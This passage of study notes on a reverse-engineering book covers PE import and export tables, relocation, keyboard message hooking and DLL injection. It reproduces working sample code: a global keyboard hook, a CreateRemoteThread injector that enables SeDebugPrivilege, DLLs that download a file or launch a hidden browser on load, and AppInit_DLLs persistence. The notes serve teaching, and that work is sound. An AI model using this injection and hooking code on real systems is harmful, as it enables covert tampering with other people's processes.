INT (RVA)</td></tr><tr><td>Name</td><td>Address of library string name (RVA)</td></tr><tr><td>FirstThunk</td><td>Address of IAT (RVA)</td></tr></tbody></table></div><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.11.png'><img src="/images/books/ReverseEngineeringCore/13.11.png" width="600"></p><h3 id="Load-into-IAT"><a href="#Load-into-IAT" class="headerlink" title="Load into IAT"></a>Load into IAT</h3><ol><li>Obtain the name of the library (for example: “kernel32.dll”) from IID (“IMAGE_IMPORT_DESCRIPTOR”)</li><li><code>LoadLibrary(&quot;kernel32.dll)</code></li><li>Read <strong>OriginalFirstThunk</strong> member from IID, and then obtain the addressof INT (Import Name Table).</li><li>Read the values from the array in INT consecutively. Subsequently, obtain the RVA (Relative Virtual Address) of <strong>IMAGE_IMPORT_BY_NAME</strong>.</li></ol><h3 id="Practice"><a href="#Practice" class="headerlink" title="Practice"></a>Practice</h3><p>Where is <strong>IMAGE_IMPORT_DESCRIPTOR</strong>? It is not located in PE header. Instead, it locates in PE body, but its location is stored in PE header.</p><p>The value of <code>IMAGE_OPTIONAL_HEADER32.DataDirectory[1].VirtualAddress</code> is the <strong>AddressOfEntryPoint</strong> (RVA value). <strong>IMAGE_IMPORT_DESCRIPTOR</strong> is also know as <strong>IMAGE_DIRECTORY_TABLE</strong>.</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.12.png'><img src="/images/books/ReverseEngineeringCore/13.12.png" width="600"></p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.13.png'><img src="/images/books/ReverseEngineeringCore/13.13.png" width="600"></p><ol><li>Name (Library Name) <p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.14.png'><img src="/images/books/ReverseEngineeringCore/13.14.png" width="800"> </p></li><li>OriginalFirstThunk——INT</li><li>IMAGE_IMPORT_BY_NAME</li><li>FirstThunk——IAT (Import Address Table)</li></ol><h2 id="13-6-EAT"><a href="#13-6-EAT" class="headerlink" title="13.6 - EAT"></a>13.6 - EAT</h2><p>The value of <code>IMAGE_OPTIONAL_HEADER32.DataDirectory[0]</code>.VirtualAddress is the RVA value of <code>IMAGE_EXPORT_DIRECTORY</code></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_EXPORT_DIRECTORY &#123;<br>DWORDCharacteristics;<br>DWORDTimeDateStamp;          //creation time date stamp<br>WORDMajorVersion;<br>WORDMinorVersion;<br>DWORDName;                   //address of library file name<br>DWORDBase;                   //ordinal base<br>DWORDNumberOfFunctions;      //number of functions<br>DWORDNumberOfNames;          //number of names<br>DWORDAddressOfFunctions;     //address of function start address array<br>DWORDAddressOfNames;         //address of function name string array<br>DWORDAddressOfNameOrdinals;  //address of ordinal array<br>&#125; IMAGE_EXPORT_DIRECTORY,*PIMAGE_EXPORT_DIRECTORY;<br><br>//Source: https://github.com/wine-mirror/wine/blob/master/include/winnt.h<br></code></pre></td></tr></table></figure><p><strong>Important fields:</strong><br>| Field | Meaning |<br>| —- | —- |<br>| NumberOfFunctions | The total number of exported functions<br>| NumberOfNames |<br>| AddressOfFunctions |<br>| AddressOfNames |<br>| AddressOfNameOrdinals |</p><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/13.15.png'><img src="/images/books/ReverseEngineeringCore/13.15.png" width="600">    <figcaption>    Source: https://baebenzene.tistory.com/5    </figcaption></p><p>A PE file obtains the function address from libraries via an API——<code>GetProcAddress()</code></p><h1 id="Chapter-16-Base-Relocation-Table"><a href="#Chapter-16-Base-Relocation-Table" class="headerlink" title="Chapter 16 - Base Relocation Table"></a>Chapter 16 - Base Relocation Table</h1><h2 id="16-1-PE-Relocation"><a href="#16-1-PE-Relocation" class="headerlink" title="16.1 - PE Relocation"></a>16.1 - PE Relocation</h2><p>Microsoft introduced <strong>ASLR</strong> technique since Windows Vista. This technique can improve security of Windows systems.</p><h2 id="16-2-The-Operations-of-PE-Relocation"><a href="#16-2-The-Operations-of-PE-Relocation" class="headerlink" title="16.2 - The Operations of PE Relocation"></a>16.2 - The Operations of PE Relocation</h2><h2 id="16-3-The-Principles-of-PE-Relocation"><a href="#16-3-The-Principles-of-PE-Relocation" class="headerlink" title="16.3 - The Principles of PE Relocation"></a>16.3 - The Principles of PE Relocation</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">typedef struct _IMAGE_BASE_RELOCATION<br>&#123;<br>DWORDVirtualAddress;<br>DWORDSizeOfBlock;<br>/* WORDTypeOffset[1]; */<br>&#125; IMAGE_BASE_RELOCATION,*PIMAGE_BASE_RELOCATION;<br></code></pre></td></tr></table></figure><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/16.1.png'><img src="/images/books/ReverseEngineeringCore/16.1.png" width="600"></p><h1 id="Chapter-17-Remove-reloc-Section-from-Executable"><a href="#Chapter-17-Remove-reloc-Section-from-Executable" class="headerlink" title="Chapter 17 - Remove .reloc Section from Executable"></a>Chapter 17 - Remove <code>.reloc</code> Section from Executable</h1><h1 id="Chapter-18-Analyzing-UPackPE-Header"><a href="#Chapter-18-Analyzing-UPackPE-Header" class="headerlink" title="Chapter 18 - Analyzing UPackPE Header"></a>Chapter 18 - Analyzing UPackPE Header</h1><h1 id="Chapter-19-UPackPE-Debugging-Find-the-OEP"><a href="#Chapter-19-UPackPE-Debugging-Find-the-OEP" class="headerlink" title="Chapter 19 - UPackPE Debugging - Find the OEP"></a>Chapter 19 - UPackPE Debugging - Find the OEP</h1><h1 id="Chapter-20-Patching"><a href="#Chapter-20-Patching" class="headerlink" title="Chapter 20 - Patching"></a>Chapter 20 - Patching</h1><h1 id="Chapter-21-Windows-Message-Hooking"><a href="#Chapter-21-Windows-Message-Hooking" class="headerlink" title="Chapter 21 - Windows Message Hooking"></a>Chapter 21 - Windows Message Hooking</h1><h2 id="21-2-Message-Hooking"><a href="#21-2-Message-Hooking" class="headerlink" title="21.2 - Message Hooking"></a>21.2 - Message Hooking</h2><p align="center" class='item-img' data-src='/images/books/ReverseEngineeringCore/21.1.png'><img src="/images/books/ReverseEngineeringCore/21.1.png" width="600"></p><h2 id="21-3-SetWindowsHookEx"><a href="#21-3-SetWindowsHookEx" class="headerlink" title="21.3 - SetWindowsHookEx()"></a>21.3 - <code>SetWindowsHookEx()</code></h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HHOOK SetWindowsHookExW(<br>  [in] int       idHook,<br>  [in] HOOKPROC  lpfn,<br>  [in] HINSTANCE hmod,<br>  [in] DWORD     dwThreadId<br>);<br></code></pre></td></tr></table></figure><h2 id="21-4-Code"><a href="#21-4-Code" class="headerlink" title="21.4 - Code"></a>21.4 - Code</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//Source: https://github.com/reversecore/book<br>//HookMain.cpp<br><br>#include &quot;stdio.h&quot;<br>#include &quot;conio.h&quot;<br>#include &quot;windows.h&quot;<br><br>#defineDEF_DLL_NAME&quot;KeyHook.dll&quot;<br>#defineDEF_HOOKSTART&quot;HookStart&quot;<br>#defineDEF_HOOKSTOP&quot;HookStop&quot;<br><br>typedef void (*PFN_HOOKSTART)();<br>typedef void (*PFN_HOOKSTOP)();<br><br>void main()<br>&#123;<br>HMODULEhDll = NULL;<br>PFN_HOOKSTARTHookStart = NULL;<br>PFN_HOOKSTOPHookStop = NULL;<br>charch = 0;<br><br>    //Load KeyHook.dll<br>hDll = LoadLibraryA(DEF_DLL_NAME);<br>    if( hDll == NULL )<br>    &#123;<br>        printf(&quot;LoadLibrary(%s) failed!!! [%d]&quot;, DEF_DLL_NAME, GetLastError());<br>        return;<br>    &#125;<br><br>    //Obtain the export functions&#x27; addresses.<br>HookStart = (PFN_HOOKSTART)GetProcAddress(hDll, DEF_HOOKSTART);<br>HookStop = (PFN_HOOKSTOP)GetProcAddress(hDll, DEF_HOOKSTOP);<br><br>    //Start hooking.<br>HookStart();<br><br>    //Wait until user enters &#x27;q&#x27;<br>printf(&quot;press &#x27;q&#x27; to quit!\n&quot;);<br>while( _getch() != &#x27;q&#x27; );<br><br>    //Stop hooking.<br>HookStop();<br><br>    //Unload KeyHook.dll<br>FreeLibrary(hDll);<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//KeyHook.cpp<br><br>#include &quot;stdio.h&quot;<br>#include &quot;windows.h&quot;<br><br>#define DEF_PROCESS_NAME&quot;notepad.exe&quot;<br><br>HINSTANCE g_hInstance = NULL;<br>HHOOK g_hHook = NULL;<br>HWND g_hWnd = NULL;<br><br>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)<br>&#123;<br>switch( dwReason )<br>&#123;<br>        case DLL_PROCESS_ATTACH:<br>g_hInstance = hinstDLL;<br>break;<br><br>        case DLL_PROCESS_DETACH:<br>break;<br>&#125;<br><br>return TRUE;<br>&#125;<br><br>LRESULT CALLBACK KeyboardProc(int nCode, WPARAM wParam, LPARAM lParam)<br>&#123;<br>char szPath[MAX_PATH] = &#123;0,&#125;;<br>char *p = NULL;<br><br>if( nCode &gt;= 0 )<br>&#123;<br>// bit 31 : 0 =&gt; press, 1 =&gt; release<br>if( !(lParam &amp; 0x80000000) )<br>&#123;<br>GetModuleFileNameA(NULL, szPath, MAX_PATH);<br>p = strrchr(szPath, &#x27;\\&#x27;);<br><br>            //Compare to current process. Message will not be passed to the next hook if the current process is notepad.exe.<br>            if( !_stricmp(p + 1, DEF_PROCESS_NAME) )<br>return 1;<br>&#125;<br>&#125;<br><br>    //If it is not notepad.exe, then the message will be passed to the next hook via calling CallNextHookEx()<br>return CallNextHookEx(g_hHook, nCode, wParam, lParam);<br>&#125;<br><br>//Export functions.<br>#ifdef __cplusplus<br>extern &quot;C&quot; &#123;<br>#endif<br>__declspec(dllexport) void HookStart()<br>&#123;<br>g_hHook = SetWindowsHookEx(WH_KEYBOARD, KeyboardProc, g_hInstance, 0);<br>&#125;<br><br>__declspec(dllexport) void HookStop()<br>&#123;<br>if( g_hHook )<br>&#123;<br>UnhookWindowsHookEx(g_hHook);<br>g_hHook = NULL;<br>&#125;<br>&#125;<br>#ifdef __cplusplus<br>&#125;<br>#endif<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">LRRESULT CALLBACK KeyboardProc(<br>    int code,       //HC_ACTION(0), HC_NOREMOVE(3)<br>    WPARAM wParam,  //virtual-key code<br>    LPARAM lParam   //extra information<br>);<br></code></pre></td></tr></table></figure><h1 id="Chapter-23-DLL-Injection"><a href="#Chapter-23-DLL-Injection" class="headerlink" title="Chapter 23 - DLL Injection"></a>Chapter 23 - DLL Injection</h1><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpvReserved)<br>&#123;<br>    switch(dwReason)<br>    &#123;<br>        case DLL_PROCESS_ATTACH:<br><br>        break;<br><br>        case DLL_THREAD_ATTACH:<br>        break;<br><br>        case DLL_THREAD_DETACH:<br>        break;<br><br>        case DLL_PROCESS_DETACH:<br>        break;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="23-1-Implementation-of-DLL-Injection"><a href="#23-1-Implementation-of-DLL-Injection" class="headerlink" title="23.1 - Implementation of DLL Injection"></a>23.1 - Implementation of DLL Injection</h2><p>Usually, there are three methods to implement DLL injection:</p><ul><li>Create remote thread via <code>CreateRemoteThread()</code> API</li><li>Using registry with modifying the value of AppInit_DLLs</li><li>SetWindowsHookEx() API</li></ul><h3 id="CreateRemoteThread"><a href="#CreateRemoteThread" class="headerlink" title="CreateRemoteThread()"></a>CreateRemoteThread()</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//myhack.cpp<br><br>#include &quot;windows.h&quot;<br>#include &quot;tchar.h&quot;<br><br>#pragma comment(lib, &quot;urlmon.lib&quot;)<br><br>#define DEF_URL     (L&quot;http://www.naver.com/index.html&quot;)<br>#define DEF_FILE_NAME   (L&quot;index.html&quot;)<br><br>HMODULE g_hMod = NULL;<br><br>DWORD WINAPI ThreadProc(LPVOID lParam)<br>&#123;<br>    TCHAR szPath[_MAX_PATH] = &#123;0,&#125;;<br><br>    if( !GetModuleFileName( g_hMod, szPath, MAX_PATH ) )<br>        return FALSE;<br><br>    TCHAR *p = _tcsrchr( szPath, &#x27;\\&#x27; );<br>    if( !p )<br>        return FALSE;<br><br>    _tcscpy_s(p+1, _MAX_PATH, DEF_FILE_NAME);<br><br>    URLDownloadToFile(NULL, DEF_URL, szPath, 0, NULL);<br><br>    return 0;<br>&#125;<br><br>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br>&#123;<br>    HANDLE hThread = NULL;<br><br>    g_hMod = (HMODULE)hinstDLL;<br><br>    switch( fdwReason )<br>    &#123;<br>    case DLL_PROCESS_ATTACH : <br>        OutputDebugString(L&quot;&lt;myhack.dll&gt; Injection!!!&quot;);<br>        hThread = CreateThread(NULL, 0, ThreadProc, NULL, 0, NULL);<br>        CloseHandle(hThread);<br>        break;<br>    &#125;<br><br>    return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><p>Once the DLL is loaded, it prints <code>&quot;myhack.dll Injection!!!&quot;</code>. It then calls the function by creating a thread (<code>ThreadProc</code>).</p><p><code>ThreadProc</code> downloads the specified HTML document with the API <code>urlmon!URLDownloadToFile()</code> and saves it as <code>index.html</code>.</p><p>Notice that once the DLL file is loaded, <code>DllMain</code> will be called automatically. Hence, once the DLL file above is loaded, the function <code>ThreadProc()</code> will eventually be executed.</p><hr><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">//InjectDll.cpp<br><br>#include &quot;windows.h&quot;<br>#include &quot;tchar.h&quot;<br><br>BOOL SetPrivilege(LPCTSTR lpszPrivilege, BOOL bEnablePrivilege) <br>&#123;<br>    TOKEN_PRIVILEGES tp;<br>    HANDLE hToken;<br>    LUID luid;<br><br>    if( !OpenProcessToken(GetCurrentProcess(),<br>                          TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, <br>              &amp;hToken) )<br>    &#123;<br>        _tprintf(L&quot;OpenProcessToken error: %u\n&quot;, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    if( !LookupPrivilegeValue(NULL,           // lookup privilege on local system<br>                              lpszPrivilege,  // privilege to lookup <br>                              &amp;luid) )        // receives LUID of privilege<br>    &#123;<br>        _tprintf(L&quot;LookupPrivilegeValue error: %u\n&quot;, GetLastError() ); <br>        return FALSE; <br>    &#125;<br><br>    tp.PrivilegeCount = 1;<br>    tp.Privileges[0].Luid = luid;<br>    if( bEnablePrivilege )<br>        tp.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;<br>    else<br>        tp.Privileges[0].Attributes = 0;<br><br>    // Enable the privilege or disable all privileges.<br>    if( !AdjustTokenPrivileges(hToken, <br>                               FALSE, <br>                               &amp;tp, <br>                               sizeof(TOKEN_PRIVILEGES), <br>                               (PTOKEN_PRIVILEGES) NULL, <br>                               (PDWORD) NULL) )<br>    &#123; <br>        _tprintf(L&quot;AdjustTokenPrivileges error: %u\n&quot;, GetLastError() ); <br>        return FALSE; <br>    &#125; <br><br>    if( GetLastError() == ERROR_NOT_ALL_ASSIGNED )<br>    &#123;<br>        _tprintf(L&quot;The token does not have the specified privilege. \n&quot;);<br>        return FALSE;<br>    &#125; <br><br>    return TRUE;<br>&#125;<br><br>BOOL InjectDll(DWORD dwPID, LPCTSTR szDllPath)<br>&#123;<br>    HANDLE hProcess = NULL, hThread = NULL;<br>    HMODULE hMod = NULL;<br>    LPVOID pRemoteBuf = NULL;<br>    DWORD dwBufSize = (DWORD)(_tcslen(szDllPath) + 1) * sizeof(TCHAR);<br>    LPTHREAD_START_ROUTINE pThreadProc;<br><br>    // #1. Obtain the Handle of notepad.exe via dwPID.<br>    if ( !(hProcess = OpenProcess(PROCESS_ALL_ACCESS, FALSE, dwPID)) )<br>    &#123;<br>        _tprintf(L&quot;OpenProcess(%d) failed!!! [%d]\n&quot;, dwPID, GetLastError());<br>        return FALSE;<br>    &#125;<br><br>    // #2. Allocate virtual memory in the address space of notepad.exe.<br>    //     The size of the allocated memory is based on szDllPath.The size virtual memory space is the size of szDllName<br>    pRemoteBuf = VirtualAllocEx(hProcess, NULL, dwBufSize, MEM_COMMIT, PAGE_READWRITE);<br><br>    // #3. Write the path of myhack.dll (szDllName) into the allocated memory space.<br>    WriteProcessMemory(hProcess, pRemoteBuf, (LPVOID)szDllPath, dwBufSize, NULL);<br><br>    // #4. Obtain the address of LoadLibraryA() API.<br>    hMod = GetModuleHandle(L&quot;kernel32.dll&quot;);<br>    pThreadProc = (LPTHREAD_START_ROUTINE)GetProcAddress(hMod, &quot;LoadLibraryW&quot;);<br><br>    // #5. Create a remote thread in notepad.exe.<br>    hThread = CreateRemoteThread(hProcess, NULL, 0, pThreadProc, pRemoteBuf, 0, NULL);<br>    WaitForSingleObject(hThread, INFINITE);<br><br>    CloseHandle(hThread);<br>    CloseHandle(hProcess);<br><br>    return TRUE;<br>&#125;<br><br>int _tmain(int argc, TCHAR *argv[])<br>&#123;<br>    if( argc != 3)<br>    &#123;<br>        _tprintf(L&quot;USAGE : %s &lt;pid&gt; &lt;dll_path&gt;\n&quot;, argv[0]);<br>        return 1;<br>    &#125;<br><br>    // change privilege<br>    if( !SetPrivilege(SE_DEBUG_NAME, TRUE) )<br>        return 1;<br><br>    // inject dll<br>    if( InjectDll((DWORD)_tstol(argv[1]), argv[2]) )<br>        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) success!!!\n&quot;, argv[2]);<br>    else<br>        _tprintf(L&quot;InjectDll(\&quot;%s\&quot;) failed!!!\n&quot;, argv[2]);<br><br>    return 0;<br>&#125;<br></code></pre></td></tr></table></figure><p>CreateRemoteThread is used to create a thread in a remote process.<br>In DLL injection, it is commonly used to make the remote process call LoadLibraryW() so that the DLL is loaded into that process.</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">HANDLE CreateRemoteThread(<br>  [in]  HANDLE                 hProcess,<br>  [in]  LPSECURITY_ATTRIBUTES  lpThreadAttributes,<br>  [in]  SIZE_T                 dwStackSize,<br>  [in]  LPTHREAD_START_ROUTINE lpStartAddress,<br>  [in]  LPVOID                 lpParameter,<br>  [in]  DWORD                  dwCreationFlags,<br>  [out] LPDWORD                lpThreadId<br>);<br></code></pre></td></tr></table></figure><h3 id="AppInit-DLLs"><a href="#AppInit-DLLs" class="headerlink" title="AppInit_DLLs"></a>AppInit_DLLs</h3><p>The principle of this method is that <strong>user32.dll</strong> automatically loads the DLLs specified in the AppInit_DLLs registry value whenever user32.dll is loaded into a process.</p><p>To enable this feature, you need to set <strong>LoadAppInit_DLLs</strong> to 1 and restart the system.</p><blockquote><p>Warning: This method is powerful because it allows a DLL to be loaded into all processes that load user32.dll. You must be careful with your DLL code; otherwise, your system may become unstable.</p></blockquote><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// myhack2.cpp<br><br>#include &quot;windows.h&quot;<br>#include &quot;tchar.h&quot;<br><br>#define DEF_CMD  L&quot;c:\\Program Files\\Internet Explorer\\iexplore.exe&quot; <br>#define DEF_ADDR L&quot;http://www.naver.com&quot;<br>#define DEF_DST_PROC L&quot;notepad.exe&quot;<br><br>BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)<br>&#123;<br>    TCHAR szCmd[MAX_PATH]  = &#123;0,&#125;;<br>    TCHAR szPath[MAX_PATH] = &#123;0,&#125;;<br>    TCHAR *p = NULL;<br>    STARTUPINFO si = &#123;0,&#125;;<br>    PROCESS_INFORMATION pi = &#123;0,&#125;;<br><br>    si.cb = sizeof(STARTUPINFO);<br>    si.dwFlags = STARTF_USESHOWWINDOW;<br>    si.wShowWindow = SW_HIDE;<br><br>    switch( fdwReason )<br>    &#123;<br>    case DLL_PROCESS_ATTACH : <br>        if( !GetModuleFileName( NULL, szPath, MAX_PATH ) )<br>            break;<br>   <br>        if( !(p = _tcsrchr(szPath, &#x27;\\&#x27;)) )<br>            break;<br><br>        if( _tcsicmp(p+1, DEF_DST_PROC) )<br>            break;<br><br>        wsprintf(szCmd, L&quot;%s %s&quot;, DEF_CMD, DEF_ADDR);<br>        if( !CreateProcess(NULL, (LPTSTR)(LPCTSTR)szCmd, <br>                            NULL, NULL, FALSE, <br>                            NORMAL_PRIORITY_CLASS, <br>                            NULL, NULL, &amp;si, &amp;pi) )<br>            break;<br><br>        if( pi.hProcess != NULL )<br>            CloseHandle(pi.hProcess);<br><br>        break;<br>    &#125;<br>   <br>    return TRUE;<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs 